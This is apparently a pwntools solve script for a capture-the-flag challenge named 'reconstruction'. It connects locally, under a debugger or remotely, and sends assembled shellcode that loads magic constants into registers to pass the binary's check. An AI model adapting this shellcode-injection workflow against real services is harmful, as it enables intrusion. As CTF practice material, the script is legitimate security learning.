#!/usr/bin/env python3

from pwn import *

e = ELF("./reconstruction_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b check
                      b *(check+0x10a)
                      c
                      ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    r.sendlineafter(b'"fix":', b'fix')
    payload = flat(
        asm('mov r8, 0x1337c0de'),
        asm('mov r9, 0xdeadbeef'),
        asm('mov r10, 0xdead1337'),
        asm('mov r12, 0x1337cafe'),
        asm('mov r13, 0xbeefc0de'),
        asm('mov r14, 0x13371337'),
        asm('mov r15, 0x1337dead'),
        asm('ret'),
        {
        59: b'I',
        },
        filler=b'I')
    r.sendlineafter(b'components:', payload)

    r.interactive()

if __name__ == "__main__":
    main()
